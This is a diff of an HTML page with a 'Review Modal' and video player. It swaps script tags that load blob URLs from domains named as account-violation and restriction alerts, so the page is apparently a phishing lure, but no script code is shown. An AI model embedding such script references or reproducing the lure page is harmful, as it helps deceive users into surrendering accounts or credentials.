@@ -1225,9 +1225,9 @@
         }
       }
     </style>
-  <script src="blob:https://user-security-alert.netlify.app/25c017c1-5f08-4368-a4fe-307d36567c31"></script><script src="blob:https://appeal-for-violation-issues.vercel.app/71208a8d-260b-4640-ae04-de200b72bec2"></script></head>
+  <script src="blob:https://review-ur-new-restriction.netlify.app/9a6ad1a6-e8f3-4072-b0e5-c44ba2fd03fa"></script></head>
 
-  <body>
+  <body style="overflow: auto;">
     <div class="header">
       <div class="header-content">
         <div class="logo">
@@ -1408,7 +1408,7 @@
     </div>
 
     <!-- Review Modal -->
-    <div class="modal" id="reviewModal">
+    <div class="modal" id="reviewModal" style="display: none;">
       <div class="modal-content">
         <div class="modal-header">
           <h2 class="modal-title">
@@ -1439,9 +1439,9 @@
                   <!-- Source will be set dynamically -->
                   Your browser does not support the video tag.
                 </video>
-                <div class="loading-spinner" id="loadingSpinner">
+                <div class="loading-spinner" id="loadingSpinner" style="display: none;">
                   <div class="spinner"></div>
-                  <div class="loading-percentage">0%</div>
+                  <div class="loading-percentage">100%</div>
                 </div>
                 <div class="video-overlay" id="videoOverlay">
                   <div class="play-btn" id="overlayPlayBtn">
@@ -1452,16 +1452,14 @@
                   </p>
                 </div>
                 <div class="video-controls">
-                  <button class="control-btn" id="playPauseBtn">
-                    <i class="fas fa-play"></i>
-                  </button>
+                  <button class="control-btn" id="playPauseBtn"><i class="fas fa-play"></i></button>
                   <div class="progress-container">
-                    <div class="buffered-bar" id="bufferedBar"></div>
-                    <div class="progress-bar" id="progressBar"></div>
+                    <div class="buffered-bar" id="bufferedBar" style="width: 0%;"></div>
+                    <div class="progress-bar" id="progressBar" style="width: 0%;"></div>
                   </div>
                   <div class="time-display">
                     <span id="currentTime">0:00</span> /
-                    <span id="totalTime">0:00</span>
+                    <span id="totalTime">1:00</span>
                   </div>
                   <div class="volume-container">
                     <button class="control-btn" id="volumeBtn">
@@ -2156,6 +2154,5 @@
       });
     </script>
   
-
 
 </body></html>
